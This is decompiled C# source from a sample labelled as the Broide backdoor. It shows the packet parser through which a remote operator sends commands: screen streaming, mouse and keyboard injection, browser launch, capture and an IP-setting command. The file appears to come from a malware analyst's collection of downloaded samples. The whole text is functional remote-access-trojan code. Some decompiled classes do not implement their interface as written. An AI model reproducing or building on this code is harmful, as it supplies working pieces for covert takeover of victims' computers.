// Decompiled with JetBrains decompiler
// Type: RemoteClient.Packets.Server.ServerPackets
// Assembly: rtewsd, Version=1.0.0.23, Culture=neutral, PublicKeyToken=null
// MVID: 26A2B99D-71EF-4F92-906D-8BA9A2FB9EEF
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Backdoor.MSIL.Broide.gen-4409d2170aa9989c6a8dd32b617c51a7c3e328b3c86410813c016691b2bd7774.exe

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace RemoteClient.Packets.Server
{
  internal class ServerPackets
  {
    private static byte[] delimiter = Encoding.ASCII.GetBytes("<EOM>");
    private static byte[] end = Encoding.ASCII.GetBytes("<EOF>");

    public static ServerPackets.IServerPacket BuildPacket(byte[] Param_398)
    {
      ServerPackets.IServerPacket serverPacket1;
      try
      {
        List<byte[]> numArrayList1 = new List<byte[]>()
        {
          Param_398
        };
        byte num = ((IEnumerable<byte>) numArrayList1[0]).ToList<byte>().GetRange(0, 1)[0];
        ServerPackets.IServerPacket serverPacket2 = (ServerPackets.IServerPacket) null;
        List<byte> list = ((IEnumerable<byte>) numArrayList1[0]).ToList<byte>();
        list.RemoveRange(0, 6);
        numArrayList1[0] = list.ToArray();
        List<byte[]> numArrayList2 = Helpers.Separate(Helpers.Separate(numArrayList1[0], ServerPackets.end)[0], ServerPackets.delimiter);
        switch (num)
        {
          case 1:
            serverPacket2 = (ServerPackets.IServerPacket) new ServerPackets.StartStream((byte) 1, numArrayList2[0][0]);
            break;
          case 2:
            serverPacket2 = (ServerPackets.IServerPacket) new ServerPackets.StopStream();
            break;
          case 3:
            serverPacket2 = (ServerPackets.IServerPacket) new ServerPackets.DoMouseEvent(numArrayList2[0][0], numArrayList2[1][0], numArrayList2[2], numArrayList2[3], numArrayList2[4][0]);
            break;
          case 4:
            serverPacket2 = (ServerPackets.IServerPacket) new ServerPackets.DoKeyboardEvent(numArrayList2[0][0], numArrayList2[1][0]);
            break;
          case 5:
            serverPacket2 = (ServerPackets.IServerPacket) new ServerPackets.StartBrowser(numArrayList2[0][0]);
            break;
          case 6:
            serverPacket2 = (ServerPackets.IServerPacket) new ServerPackets.Diskonect();
            break;
          case 7:
            serverPacket2 = (ServerPackets.IServerPacket) new ServerPackets.GetCodecInfo();
            break;
          case 8:
            serverPacket2 = (ServerPackets.IServerPacket) new ServerPackets.CaptureInit();
            break;
          case 9:
            serverPacket2 = (ServerPackets.IServerPacket) new ServerPackets.SetPupIp(Encoding.ASCII.GetString(numArrayList2[0]));
            break;
        }
        serverPacket1 = serverPacket2;
        goto label_14;
      }
      catch
      {
      }
      serverPacket1 = (ServerPackets.IServerPacket) null;
label_14:
      return serverPacket1;
    }

    public interface IServerPacket
    {
      byte GetType();
    }

    public class StartStream : ServerPackets.IServerPacket
    {
      public byte byte_1;
      public byte byte_2;

      public StartStream(byte Param_402, byte Param_403)
      {
        this.byte_1 = Param_402;
        this.byte_2 = Param_403;
      }

      public byte Vmethod_175() => this.byte_1;
    }

    public class StopStream : ServerPackets.IServerPacket
    {
      public byte byte_3 = 2;

      public byte Vmethod_176() => this.byte_3;
    }

    public class DoMouseEvent : ServerPackets.IServerPacket
    {
      public byte byte_4 = 3;
      public InputEmulation.MouseAction Class13_320;
      public bool Boolean_321;
      public int int_141;
      public int int_142;
      public int int_143;

      public DoMouseEvent(
        byte Param_408,
        byte Param_409,
        byte[] Param_410,
        byte[] Param_411,
        byte Param_412)
      {
        this.Class13_320 = (InputEmulation.MouseAction) Param_408;
        this.Boolean_321 = Param_409 == (byte) 1;
        this.int_141 = BitConverter.ToInt32(Param_410, 0);
        this.int_142 = BitConverter.ToInt32(Param_411, 0);
        this.int_143 = (int) Param_412;
      }

      public byte Vmethod_177() => this.byte_4;
    }

    public class DoKeyboardEvent : ServerPackets.IServerPacket
    {
      public byte byte_5 = 4;
      public byte byte_6;
      public bool Boolean_322;

      public DoKeyboardEvent()
      {
      }

      public DoKeyboardEvent(byte Param_416, byte Param_417)
      {
        this.byte_6 = Param_416;
        this.Boolean_322 = Param_417 == (byte) 1;
      }

      public byte Vmethod_178() => this.byte_5;
    }

    public class StartBrowser : ServerPackets.IServerPacket
    {
      public byte byte_7 = 5;
      public byte byte_8;

      public StartBrowser(byte Param_420) => this.byte_8 = Param_420;

      public byte Vmethod_179() => this.byte_7;
    }

    public class Diskonect : ServerPackets.IServerPacket
    {
      public byte byte_9 = 6;

      public byte Vmethod_180() => this.byte_9;
    }

    public class GetCodecInfo : ServerPackets.IServerPacket
    {
      public byte byte_10 = 7;

      public byte Vmethod_181() => this.byte_10;
    }

    public class CaptureInit : ServerPackets.IServerPacket
    {
      public byte byte_11 = 8;

      public byte Vmethod_182() => this.byte_11;
    }

    public class SetPupIp : ServerPackets.IServerPacket
    {
      public byte type = 9;
      public string LogData;

      public SetPupIp(string Param_429) => this.LogData = Param_429;

      public byte GetType() => this.type;
    }
  }
}
